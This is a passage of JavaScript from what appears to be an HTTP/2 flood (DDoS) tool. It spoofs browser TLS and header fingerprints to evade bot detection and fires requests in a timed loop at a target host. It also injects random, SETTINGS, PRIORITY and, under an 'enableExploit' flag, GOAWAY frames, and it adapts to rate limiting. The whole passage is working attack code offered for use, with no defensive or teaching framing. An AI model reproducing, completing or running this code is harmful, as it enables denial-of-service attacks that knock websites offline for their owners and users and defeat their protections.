        { width: 1280, height: 1024, availWidth: 1280, availHeight: 984, colorDepth: 24, pixelDepth: 24 },
        { width: 1600, height: 900, availWidth: 1600, availHeight: 860, colorDepth: 24, pixelDepth: 24 }
    ];
    const randomScreen = screenSizes[Math.floor(Math.random() * screenSizes.length)];
    const viewportWidth = getRandomInt(800, randomScreen.width);
    const viewportHeight = getRandomInt(600, randomScreen.height);
    
    const timezones = [
        "America/New_York", "America/Los_Angeles", "Europe/London", "Europe/Berlin", 
        "Asia/Tokyo", "Asia/Shanghai", "Australia/Sydney", "Asia/Dubai", 
        "America/Sao_Paulo", "Africa/Johannesburg"
    ];
    const randomTimezone = timezones[Math.floor(Math.random() * timezones.length)];
    const timezoneOffset = getRandomInt(-720, 720);

    const customAcceptLanguage = language_header[Math.floor(Math.random() * language_header.length)];
    header["Accept-Language"] = customAcceptLanguage;
    
    const canvasFingerprint = crypto.createHash('md5').update(randstr(16) + Date.now().toString()).digest('hex').substring(0, 16);
    
    const fingerprintHeaders = {
        "X-WebGL-Renderer": randomWebGL,
        "Sec-CH-Viewport-Width": viewportWidth.toString(),
        "Sec-CH-Device-Memory": ["4", "8", "16"][Math.floor(Math.random() * 3)],
        "Sec-CH-DPR": (Math.random() * 2 + 1).toFixed(1),
        "X-Screen-Width": randomScreen.width.toString(),
        "X-Screen-Height": randomScreen.height.toString(),
        "X-Screen-AvailWidth": randomScreen.availWidth.toString(),
        "X-Screen-AvailHeight": randomScreen.availHeight.toString(),
        "X-Color-Depth": randomScreen.colorDepth.toString(),
        "X-TimeZone": randomTimezone,
        "X-TimeZone-Offset": timezoneOffset.toString(),
        "X-Canvas-Fingerprint": canvasFingerprint
    };

    for (const [key, value] of Object.entries(fingerprintHeaders)) {
        if (!header[key]) header[key] = value;
    }
    
    let pendingRequests = [];
    function sendRequest(headers) {
        const req = client.request(headers, {
            endStream: true
        });
        req.on('error', () => req.destroy());
        req.end();
        pendingRequests.push(headers);
    }
    let pragmalenght = querylenght.split("-");
    if (querylenght !== "1-1") {
        pragmalenght = querylenght.split("-");
    }
    const pargram = generateRandomString(parseInt(pragmalenght[0]), parseInt(pragmalenght[1]));
    async function createCustomTLSSocket(parsed, browserFingerprint) {
        try {
            const tls_conn = await tls.connect({
                servername: parsed.host,
                host: parsed.host,
                port: 443,
                rejectUnauthorized: false,
                minVersion: browserFingerprint.tlsVersions.min,
                maxVersion: browserFingerprint.tlsVersions.max,
                ecdhCurve: browserFingerprint.ecdhCurve,
                ciphers: browserFingerprint.ciphers,
                sigalgs: browserFingerprint.signatureAlgorithms,
                ALPNProtocols: browserFingerprint.alpnProtocols,
                honorCipherOrder: true,
                secureOptions: secureOptionsList.reduce((acc, opt) => acc | opt, 0),
                ...(Math.random() < 0.5 ? { requestOCSP: true } : { requestCert: true }),
                highWaterMark: 1024 * 1024
            });
            return tls_conn;
        } catch (err) {
            throw err;
        }
    }
    const closeConnections = (client, tlsSocket) => {
        if (client) client.destroy();
        if (tlsSocket) tlsSocket.end();
    };

    const connectionBrowser = getRandomBrowser();
    const fingerprint = createRealisticClientHello(connectionBrowser);

    let tlsSocket;
    try {
        tlsSocket = await createCustomTLSSocket(parsed, fingerprint);
    } catch (err) {
        return;
    }

    let client;
    const browserSettings = h2Settings(connectionBrowser);
    const settingsObj = {
        headerTableSize: browserSettings.SETTINGS_HEADER_TABLE_SIZE || HTTP2_SETTINGS_DEFAULTS[HTTP2_SETTINGS.HEADER_TABLE_SIZE],
        enablePush: (browserSettings.SETTINGS_ENABLE_PUSH || HTTP2_SETTINGS_DEFAULTS[HTTP2_SETTINGS.ENABLE_PUSH]) === 1,
        initialWindowSize: browserSettings.SETTINGS_INITIAL_WINDOW_SIZE || HTTP2_SETTINGS_DEFAULTS[HTTP2_SETTINGS.INITIAL_WINDOW_SIZE],
        maxHeaderListSize: browserSettings.SETTINGS_MAX_HEADER_LIST_SIZE || HTTP2_SETTINGS_DEFAULTS[HTTP2_SETTINGS.MAX_HEADER_LIST_SIZE],
        maxFrameSize: browserSettings.SETTINGS_MAX_FRAME_SIZE || HTTP2_SETTINGS_DEFAULTS[HTTP2_SETTINGS.MAX_FRAME_SIZE]
    };

    try {
        client = await http2.connect(parsed.href, {
            createConnection: () => tlsSocket,
            settings: settingsObj
        }, (session) => {
            session.setLocalWindowSize(15663105 + 65535);
        });
    } catch (err) {
        closeConnections(null, tlsSocket);
        return;
    }

    client.on('error', err => {
        closeConnections(client, tlsSocket);
    });

    client.on('goaway', (errorCode, lastStreamID, opaqueData) => {
        pendingRequests.forEach(headers => sendRequest(headers));
        closeConnections(client, tlsSocket);
        if (enableRatelimit) {
            applyBackoff(backoffConfig.onGoaway, 1).catch(() => {});
        }
    });

    client.on('close', () => {
        closeConnections(client, tlsSocket);
    });

    client.once('connect', async () => {
        const intervalId = setInterval(async () => {
            if (client.destroyed) {
                clearInterval(intervalId);
                client.close();
                return;
            }
            for (let i = 0; i < rps; i++) {
                let author = {
                    ...(post === 'true' ? { ":method": "POST", "content-length": "0" } : { ":method": 'GET' }),
                    ":authority": parsed.host,
                    ":scheme": "https",
                    ":path": path
                };
                let dynamicHeaders = { ...header };
                dynamicHeaders = addPluginHeaders(dynamicHeaders, connectionBrowser);
                const pre = Buffer.from("PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n", 'binary');
                const head = dynamicHeaders;
                const request = client.request({ ...author, ...head }, {
                    endStream: Math.random() < 0.5,
                    weight: 256,
                    parent: 0,
                    exclusive: true
                });
                applyBrowserPriority(request, connectionBrowser);
                request.on('response', (res) => {
                    request.push(pre);
                    reswritedata(request);
                    response(res);
                    const status1 = res[':status'];
                    if (enableRatelimit && status1 === 429) {
                        maprate.push({ proxy: parsed.host, timestamp: Date.now() });
                        rps = 5;
                        closeConnections(client, tlsSocket);
                        if (res["retry-after"]) {
                            const retryAfter = parseInt(res["retry-after"]) * 1000;
                            applyBackoff(backoffConfig.on429, 1, retryAfter).catch(() => {});
                        } else {
                            applyBackoff(backoffConfig.on429, 1).catch(() => {});
                        }
                    }
                    if (res["set-cookie"]) {
                    }
                    if (enableRedirect && res["location"]) {
                        parsed = new URL(res["location"]);
                        if (enableRatelimit) {
                            applyBackoff(backoffConfig.onRedirect, 1).catch(() => {});
                            setTimeout(() => {
                                if (!request.closed) {
                                    try { request.close(); } catch(e){}
                                }
                            }, getRandomInt(50, 250));
                        }
                    }
                });
                request.on('error', (err) => {
                    request.destroy();
                });
                request.end();
                if (Math.random() < 0.1 && client.socket && !client.destroyed) {
                    try {
                        const randomFrame = createRandomFrame();
                        client.socket.write(randomFrame);
                    } catch(e) {}
                }
                if (Math.random() < 0.15 && client.socket && !client.destroyed) {
                    try {
                        const dynamicSettings = {};
                        dynamicSettings[HTTP2_SETTINGS.INITIAL_WINDOW_SIZE] = Math.floor(Math.random() * 10000000) + 5000000;
                        const settingsFrame = createSettingsFrame(dynamicSettings);
                        client.socket.write(settingsFrame);
                    } catch(e) {}
                }
                if (Math.random() < 0.2 && client.socket && !client.destroyed) {
                    try {
                        const priorityData = getBrowserPriorityData(connectionBrowser);
                        const priorityFrame = createPriorityFrame(request.id || Math.floor(Math.random() * 1000) + 1, priorityData);
                        client.socket.write(priorityFrame);
                    } catch(e) {}
                }
                if (enableExploit && Math.random() < 0.3 && client.socket && !client.destroyed) {
                    try {
                        const errorCodes = [0x0, 0x1, 0x2, 0x5, 0x8];
                        const goawayStreamId = request.id || (Math.floor(Math.random() * 1000) + 1);
                        const goawayError = errorCodes[Math.floor(Math.random() * errorCodes.length)];
                        const goawayFrame = createGoawayFrame(goawayStreamId, goawayError);
                        client.socket.write(goawayFrame);
                    } catch(e) {}
                }
            }
        }, interval);

        setTimeout(() => {
            closeConnections(client, tlsSocket);
        }, 5 * 1000);
    });
}
